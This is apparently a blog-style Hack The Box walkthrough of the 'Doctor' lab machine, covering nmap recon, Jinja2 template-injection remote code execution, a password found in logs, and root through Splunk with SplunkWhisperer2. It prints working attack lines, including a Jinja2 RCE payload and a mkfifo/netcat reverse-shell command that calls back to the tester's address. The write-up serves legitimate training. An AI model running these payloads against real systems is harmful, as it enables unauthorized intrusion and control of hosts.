![[alAKF7KqE5nj9L3O-generated_image.jpg]]
---

# **Hack The Box: Doctor**

_A Thorough Web App Security Walkthrough_

---

## **🚀 Why Web App Security?**

Before diving in, let’s address _why_ we’re here:

- **Employers**: This walkthrough demonstrates not only my practical hacking skills but also my understanding of **web application security** fundamentals. You’ll see me apply concepts from **OWASP Top 10** vulnerabilities and real-world methodology.
- **Aspiring Pentesters**: If you’re building your skillset, let this serve as a **teachable moment**. Each step, I’ll show how to think like a **web app hacker** while using **TCM Security**’s approach.
- **TCM Security Influences (PJPT, PWPA, PWPP)**: The training from these courses helped me develop the habit of enumerating systematically, always checking for **injection points**, **misconfigurations**, and potential **access control issues** all typical of the **OWASP Top 10**.

---

## **🛠️ Your Arsenal for HTB: Doctor**

First things first: let’s talk gear. This box is a web app, so here’s what I’m rolling with:

|🛠️ Tool|🔍 Purpose|
|---|---|
|**Nmap**|Port scanning & service enumeration (recon).|
|**Burp Suite**|Intercepting & modifying web traffic (a must for **OWASP Top 10** testing).|
|**nano / mousepad**|Quick edits on payloads and scripts.|
|**XSS Payloads**|Testing for **Cross-Site Scripting** (OWASP A07:2021 – Identification and Exploitation).|
|**SQL Injection Payloads**|Looking for **SQLi** (OWASP A03:2021 – Injection).|
|**SSTI Payloads**|Hunting **Server-Side Template Injection** vulnerabilities.|

> **TCM Security Shoutout**: In the **PJPT**, **PWPA**, and **PWPP**, I learned to treat each tool as part of an **offensive arsenal**, but also how to pivot and adapt in real time, just like a real **internal pentest** scenario.

---

## **Game Plan**

- **Grab initial recon** with Nmap.
- **Dive into the web application**:
    - Check for classic OWASP vulnerabilities (SQLi, XSS).
    - Explore more advanced ones (Template Injection).
- **Find initial creds** → pivot to new users.
- **Leverage Splunk** misconfiguration for **root** access.

Let’s jump in.

---

## **1. Recon & Enumeration**

### **Nmap: Checking Our Doors**

I always start with **Nmap**, it’s my go-to scanning tool and it should be yours too it's a way to let us know where we are in the environment and what is around us. Lets run the following:

```bash
nmap -sV -sC -Pn -T4 10.10.10.209
```

|**Flag**|**Meaning**|
|---|---|
|`-sV`|Grab service versions (for example, Apache vs. Nginx).|
|`-sC`|Run default scripts (think of it like quick autopilot enumeration).|
|`-Pn`|Assume host is up (skip ping checks).|
|`-T4`|Faster scan without going full berserk (`T5`).|

**Why**: This approach helps identify **services** that might have known vulnerabilities (looking at you, **OWASP A09:2021 – Security Logging and Monitoring** if misconfigured, or potential **A05:2021 – Security Misconfiguration**).

**Scan Results**:  
![[nmap-results.png]]

- **Port 80 (HTTP)** open → likely a web interface. We know that visiting 10.10.10.209 should bring up a website.
- **Port 8089 (Splunk)** open with **ssl/http** → interesting, Splunk might be misconfigurable or hold sensitive info. Keep this in mind, write it down somewhere, always come back to our initial "foot in the door" enumeration.

> **TCM Security Habit**: We always note any unusual service—**Splunk** stands out because it can be exploited if left open or misconfigured, especially if credentials are leaked.

---

## **2. Web Exploration: Doctors.htb**

Visiting `http://10.10.10.209` gets us a “Health Solutions” page. From here on out, lets pretend that Health Solutions is our client asking us to do a Web App Pentest:

![[homepage.png]]

I notice:

- Phone, address (not relevant for the hack, but typical corporate details).
	- We aren't going to call the number for this box, maybe in a real pen test as part of our OSINT, and we aren't going to visit the address again maybe as part of the OSINT enumeration but we are web app pen testers, so there is only one thing that sticks out.
- An email: `info@doctors.htb`.

### **Add doctors.htb to /etc/hosts**

```bash
sudo mousepad /etc/hosts
```
or nano or vim whatever you prefer I know everyone has there preferences, just make sure you know how to exit out of the text editor :)

Add:

```
10.10.10.209 doctors.htb
```

## Why This Works

- The machine likely **expects** us to access it via `doctors.htb` rather than just the IP address.
- Some web applications behave **differently** depending on the hostname used, often due to **virtual hosting**.
- This could unlock **new content, new functionality, or even a hidden login page** that wasn’t visible when we visited the raw IP.
---

### **Navigating to doctors.htb**

![[login.png]]

We see a **login** screen. CSS might look broken at first, but no big deal. This hints we might be dealing with a quirky setup or partial content. Actually a quick update, I switched the VPN from EU to US in the HTB website and this made the CSS load way faster. So quick tip for everyone there.

**OWASP Angle**: This is typically where we check for **Injection** (SQLi), **Broken Authentication** (OWASP A01:2021), or any **XSS** in user inputs. Refer to the screenshot for this.

---

## **Endpoint: /login?next=%2F**

We see:

- **Login and Register** options
- **Remember Me** checkbox (potential session management vector—**OWASP A07**)
- **Forgot Password** (possible exploitation of **race conditions** or token tampering—**OWASP A02**)

### **Register a New User**

We’ll create an account to see the next stage:

![[register.png]]

> **Side Note**: _OWASP A05:2021 – Security Misconfiguration_ also suggests we check if the site enforces strong passwords, or if there’s a **Registration** endpoint vulnerable to weird payloads. I used the password test which is 4 characters, so we know there is literally no password complexity implemented here.

---

### **📌 Side Note: Web App Pentesting Considerations (Feel Free to Skip This Section)**

> This is **not part of the walkthrough**, so if you just want to follow the steps, feel free to skip this. But if you're looking to sharpen your web app pentesting mindset, this section is for you.

If this were a real-world web app penetration test, this page should immediately trigger a few thoughts:

- **Does the login form have SQL injection vulnerabilities?**
    
    - If we had usernames from reconnaissance, we could try **SQL injection for authentication bypass**.
    - Could there be a **second-order SQL injection** vulnerability somewhere deeper in the application?

- **Could this be vulnerable to stored XSS?**
    
    - Does it reflect user input somewhere on the page?
    - If we register, does our username or email get displayed anywhere else later?

- **Are there broken access controls?**
    
    - Can we access restricted areas by modifying the request?
    - What happens if we sign up and try visiting `/admin`?
- **What’s happening with session management?**
    
    - Does Burp Suite show that this page sets **cookies** when we log in?
    - If we check the "Remember Me" box, how does that affect the request and response?
    - Can we manipulate cookies to maintain access longer than intended?

- **What about race conditions on the "Forgot Password" feature?**
    
    - If we spam password reset requests, do we cause weird behavior?
    - Could an attacker potentially exploit this for account takeover?

Again, this is **extra knowledge for web app pentesters**, not a required step for solving the box. We’re about to **register a new user and see where it takes us**.

---

## **Landing in the Web App**

After registration, we see:

![[home-doctors.png]]

There’s a “New Message” feature at `/Home`. We should open **Burp Suite** to watch for cookies and session tokens (OWASP session mgmt best practices).

### **New Message**: Potential XSS, SQLi, or Template Injection

![[post-new.png]]

Here’s where a **web app** pentester would methodically test:

1. **XSS** → Insert `<script>` or HTML tags.
2. **SQLi** → Insert `' OR 1=1 --` type payloads.
3. **Template Injection** → Insert `{{7*7}}` or special polyglots.

Given my **TCM Security** training, I note the fastest tests: XSS or template injection. Let’s try a quick XSS:

```html
<h1>xss</h1><strong>xss</strong>
```

![[xss-payload.png]]

No reflection, **the site filters** our markup. Possibly **OWASP A03:2021 – Injection** is partially mitigated. Let’s pivot to **Template Injection**.

Lets check out the source code:

![[source-code-xss.png]]

We learn that it is being filtered out, so we either have to look for ways to bypass the filtering to get a food in the door for vertical movement, but lets move on to another attack for now and return to it later if we aren't successful.


---

## **Template Injection: The Polyglot Move**

Template injection happens when user input is processed by a template engine in an unsafe way. Instead of guessing which engine is in use, we’ll start with a **polyglot payload**, a string designed to trigger errors across multiple engines:

We use a polyglot payload:

```
${{<%[%'"}}%\.
```

If it triggers a 500 error, we have injection. 

Lets put it in the title and content sections, we don't know which one will process it so just to be on the safe side lets see what happens here:

![[post-polygot.png]]  
![[polyglot-reflected.png]]

It gets reflected back but sanitized, no 500 error. Similar to the XSS payload, lets investigate the source code to see what is happening, how is it being filtered? 

We find a clue in the source about an **/archive** endpoint:

![[source-code-archive.png]]

Visiting `/archive` yields an **error page**:

![[archive-error.png]]

**Yes!** This suggests partial template injection that might be triggered elsewhere. Alright things are about to pick up, we can now concentrate on SSTI instead of other attacks.

---

## **Confirming Jinja2 with {{7*7}}**

From **PayloadsAllTheThings**, we know:

- `{{7*7}}` → Jinja2
- `#{7*7}` → Thymeleaf

We’ll also consult the handy **flowchart** below (screen shot is from payloadsallthethings):

![[ssti-flowchart.png]]

We remove the old post since, make a new one with `{{7*7}}`, then check `/archive`:

![[archive-49.png]]

Boom **49**. That’s Jinja2 evaluating the expression. That’s a classic **OWASP A03:2021 – Injection** scenario.

---

### __Another Test: {{7_'7'}}_*

If it yields `7777777`, we’re definitely dealing with Jinja2 (not Twig). Sure enough, we see it. Next step? **RCE** with a custom payload.

---

## **3. Gaining a Foothold via SSTI**

### **The Jinja2 RCE Payload**

```python
{% for x in ().__class__.__base__.__subclasses__() %}
  {% if "warning" in x.__name__ %}
    {{ x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;...").read().zfill(417) }}
  {% endif %}
{% endfor %}
```

This loops through Python’s internals (subclasses) to access built-ins, then runs `popen()` for a reverse shell. It’s ugly but potent.

**Breaking it down**:

1. **Enumerate subclasses** → find “warning” classes that can call built-ins.
2. **`__import__('os')`** → import the OS module.
3. **`popen()`** → run a system command, e.g., a Python reverse shell.

> This is exactly the type of **complex injection** that often slips by lesser filters—**OWASP A03** again.

---

### **Swapping `cat flag.txt` for a Real Shell**

By default, the example might just run `cat flag.txt`. We want an **interactive** shell:

```python
subprocess.call(["/bin/bash", "-i"]);
```

Also, update the IP to yours, open a netcat listener:

```bash
nc -lvnp 4444
```

Then revisit `/archive` to trigger the code. If done right, you’ll catch a **reverse shell**:

![[reverse-shell-success.png]]

---

### **Upgrading to an Interactive Shell**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Now you can use TTY features, see password prompts, etc.

---

## **4. Lateral Movement & Credential Hunting**

### **Checking Logs for Credentials**

I know from **TCM Security** classes that logs can be gold. For instance:

```bash
grep -R -o "password" /var/log
```

![[enum-user-creds.png]]

We spot a **failed login** for `shaun` with `Guitar123`. Looks like someone typed their password into the wrong field. Classic mistake—**OWASP A07:2021 – Identification & Auth Failures** if creds get logged in plaintext.

Let’s try it:

```bash
su shaun
```

Password: `Guitar123`

We’re in. This typically means we can now check **/home/shaun** for the **user flag**.

![[login-shaun.png]]

Sure enough, **user.txt** is there:

```bash
cat user.txt
```

![[userflag.png]]

**User flag** acquired.

---

## **5. Splunk Recon & Root Escalation**

Remember from Nmap we saw **Splunk** on port 8089. Splunk has a management interface that might let us run commands if we can authenticate.

A quick check:

```bash
ps aux | grep splunk
```

![[grep-splunk-proc.png]]

**Splunk** is definitely running. Time to see if it’s configured with default or reused creds. Searching around, we find a tool:

[SplunkWhisperer2 - Splunk Universal Forwarder Hijacking](https://clement.notin.org/blog/2019/02/25/Splunk-Universal-Forwarder-Hijacking-2-SplunkWhisperer2/)

We download it. (If you can’t, disconnect from HTB VPN, grab it, then reconnect.)

---

### **Using SplunkWhisperer2**

Test a simple `id` payload:

```bash
python3 PySplunkWhisperer2_remote.py \
  --host 10.10.10.209 \
  --lhost 10.10.14.38 \
  --payload id
```

Fails—needs auth. Let’s try `shaun:Guitar123`. Fire up a listener on `1994`:

```bash
nc -lvp 1994
```

Then run:

```bash
python3 PySplunkWhisperer2_remote.py \
  --host 10.10.10.209 \
  --username shaun \
  --password Guitar123 \
  --lhost 10.10.14.38 \
  --payload 'rm /tmp/0xjcbk_pipe;mkfifo /tmp/0xjcbk_pipe;cat /tmp/0xjcbk_pipe|/bin/sh -i 2>&1|nc 10.10.14.38 1994 >/tmp/0xjcbk_pipe'
```

Explanation:

- `--username shaun --password Guitar123` → We reuse discovered creds.
- `--payload` → A custom reverse shell pipeline that connects back.

**RCE success**:

![[pysplunkRCE.png]]

---

### **Root Flag**

Check the new shell. If you can `ls` around and see **/root**, you’re basically at top-level.

```bash
cat /root/root.txt
```

![[root.png]]

We’ve got it—**root flag** down.

---

## **6. Final Reflections**

### **OWASP Top 10 Observations**

1. **Injection (A03:2021)**:
    
    - Template Injection (Jinja2).
    - Potential for SQLi had we found other endpoints.
2. **Security Misconfiguration (A05:2021)**:
    
    - Splunk interface left accessible with default or reused creds.
3. **Identification & Auth Failures (A07:2021)**:
    
    - Admin fat-fingering password logs.
4. **Data Exposure**:
    
    - If logs had more sensitive info, that’d be a direct violation of data protection best practices.

In a real-world engagement, each step would be documented and reported with recommended fixes (like restricting Splunk to internal addresses only, or sanitizing logs for credentials).

---

### **Shout-Out to TCM Security (PJPT, PWPA, PWPP)**

Throughout this box, the methods and mindsets come straight from these courses. **PJPT** (Practical Junior Pentester) taught me the fundamentals of scanning and pivoting. **PWPA** (Practical Web Pentesting Analyst) honed my approach on OWASP vulnerabilities. **PWPP** (Practical Web Payload Pentesting) pushed me to develop advanced exploit payloads—like the ones we used in Jinja2 injection.

**Employers**: This synergy of hands-on labs plus methodical training is exactly what I bring to a real-world security team.

---

## **Final Thoughts:**

- We combined **web enumeration** with **OWASP Top 10** knowledge to pwn this box.
- **SSTI** gave initial access; pivoting on **logged credentials** (a real-life, messy scenario) got us user.
- Finally, misconfiguration in **Splunk** handed us **root**.

This path showcases not only technical prowess but also a deeper understanding of **web app security** best practices, from **XSS filtering** to **Template Injection** to **Session/Logging misconfigurations**. If you read this as a potential employer or a budding pentester, hope you found it valuable—and a glimpse into my **TCM Security**-inspired methodology.

**We are done here**. Two flags secured, knowledge gained, and a whole lot of fun in the process. See you on the next box.